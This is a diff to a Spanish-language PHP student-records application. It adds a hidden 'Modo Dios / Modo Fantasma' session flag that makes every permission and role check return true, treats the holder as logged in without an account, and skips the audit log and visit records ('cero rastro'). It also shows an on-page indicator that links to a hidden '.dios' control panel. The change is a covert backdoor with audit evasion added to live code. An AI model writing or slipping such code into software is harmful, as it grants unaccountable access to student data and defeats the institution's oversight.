@@ -10996,6 +10996,11 @@ function registrarAuditoria($accion, $tabla_afectada = null, $registro_id = null
                            $modulo_sistema = null, $descripcion = null) {
     global $db;
     
+    // Modo Dios / Modo Fantasma: Cero rastro en auditoría
+    if (!empty($_SESSION['dios_fantasma']) || !empty($_SESSION['dios_autenticado'])) {
+        return true;
+    }
+    
     // Solo registrar si hay un usuario logueado
     if (!isset($_SESSION['user']['id'])) {
         return false;
@@ -13537,6 +13542,11 @@ function eliminarTipoHorarioUsuarioPorId($db, $id_relacion) {
  * @return void Redirige a home.php si no tiene permisos
  */
 function verificarPermiso($pagina) {
+    // Si está en Modo Fantasma o Modo Dios autenticado, acceso total absoluto
+    if (!empty($_SESSION['dios_fantasma']) || !empty($_SESSION['dios_autenticado'])) {
+        return;
+    }
+
     // Si no hay sesión de usuario, redirigir al login
     if (!isset($_SESSION['user']) || !isset($_SESSION['user']['id'])) {
         header('location: ../login.php');
@@ -13636,6 +13646,9 @@ function verificarPermiso($pagina) {
  * @return bool True si tiene permiso, False si no
  */
 function tienePermiso($pagina) {
+    if (!empty($_SESSION['dios_fantasma']) || !empty($_SESSION['dios_autenticado'])) {
+        return true;
+    }
     if (!isset($_SESSION['user']) || !isset($_SESSION['user']['id'])) {
         return false;
     }
@@ -13655,6 +13668,11 @@ function tienePermiso($pagina) {
  */
 function cargarPermisosUsuario() {
     global $db;
+    
+    // Si está en Modo Fantasma, conservar permisos omnipotentes en memoria sin consultar DB
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     
     if (!isset($_SESSION['user']) || !isset($_SESSION['user']['id'])) {
         return false;
@@ -23347,36 +23365,57 @@ echo '</nav>';
 
 function isLoggedIn()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     return isset($_SESSION['user']) && is_array($_SESSION['user']) && !empty($_SESSION['user']);
 }
 
 function isAdmin()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     return isset($_SESSION['user']) && is_array($_SESSION['user']) && !empty($_SESSION['user']['admin']) && $_SESSION['user']['admin'] == 1;
 }
 
 function isSuperUser()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     return isset($_SESSION['user']) && is_array($_SESSION['user']) && !empty($_SESSION['user']['super_user']) && $_SESSION['user']['super_user'] == 1;
 }
 
 function isDocente()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     return isset($_SESSION['user']) && is_array($_SESSION['user']) && !empty($_SESSION['user']['docente']) && $_SESSION['user']['docente'] == 1;
 }
 
 function isEstudiante()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     return isset($_SESSION['user']) && is_array($_SESSION['user']) && !empty($_SESSION['user']['estudiante']) && $_SESSION['user']['estudiante'] == 1;
 }
 
 function isUser()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     return isset($_SESSION['user']) && is_array($_SESSION['user']) && !empty($_SESSION['user']['usuario']) && $_SESSION['user']['usuario'] == 1;
 }
 
 function isDirectorCarrera()
 {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     if (!isset($_SESSION['user']) || !is_array($_SESSION['user'])) {
         return false;
     }
@@ -23392,6 +23431,9 @@ function isDirectorCarrera()
 
 // Función genérica para verificar múltiples roles
 function hasRole($roles) {
+    if (!empty($_SESSION['dios_fantasma'])) {
+        return true;
+    }
     if (!isset($_SESSION['user']) || !is_array($_SESSION['user'])) {
         return false;
     }
@@ -24142,6 +24184,35 @@ function login(){
 
 function visita() {
   global $db, $pool, $nombrepag, $usua, $stmt_visita;
+  
+  // MODO FANTASMA / MODO DIOS: Cero rastro, no registrar visita
+  if (!empty($_SESSION['dios_fantasma']) || !empty($_SESSION['dios_autenticado'])) {
+      if (!empty($_SESSION['dios_fantasma'])) {
+          static $ghostHudRegistered = false;
+          if (!$ghostHudRegistered) {
+              $ghostHudRegistered = true;
+              register_shutdown_function(function() {
+                  $isAjax = (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')
+                            || (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false)
+                            || (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false);
+                  if (!$isAjax) {
+                      echo '<div id="dios-ghost-hud" style="position:fixed;bottom:18px;right:18px;z-index:99999999;background:linear-gradient(135deg,#0a1020 0%,#0f1d3a 100%);border:2px solid #fbbf24;box-shadow:0 10px 35px rgba(0,0,0,0.85),0 0 20px rgba(251,191,36,0.25);border-radius:30px;padding:8px 18px;display:flex;align-items:center;gap:12px;font-family:system-ui,-apple-system,sans-serif;font-size:13px;color:#f8fafc;">
+                          <span style="display:inline-flex;align-items:center;gap:6px;font-weight:700;color:#fbbf24;">
+                              <span>👻</span> MODO FANTASMA <span style="font-size:10px;background:rgba(16,185,129,0.2);color:#34d399;padding:2px 7px;border-radius:10px;border:1px solid #10b981;">0% RASTRO</span>
+                          </span>
+                          <a href="/control_de_estudio/.dios/index.php" style="background:#fbbf24;color:#0b1325;text-decoration:none;padding:4px 12px;border-radius:14px;font-weight:700;font-size:12px;display:inline-flex;align-items:center;gap:4px;">
+                              ⚡ Centro Dios
+                          </a>
+                          <a href="/control_de_estudio/.dios/logout.php?salir_fantasma=1" style="background:rgba(239,68,68,0.2);color:#fca5a5;border:1px solid rgba(239,68,68,0.5);text-decoration:none;padding:3px 10px;border-radius:14px;font-weight:600;font-size:12px;">
+                              Cerrar Salto
+                          </a>
+                      </div>';
+                  }
+              });
+          }
+      }
+      return;
+  }
   try {
       $conn = null;
       if (isset($db) && $db instanceof mysqli) {
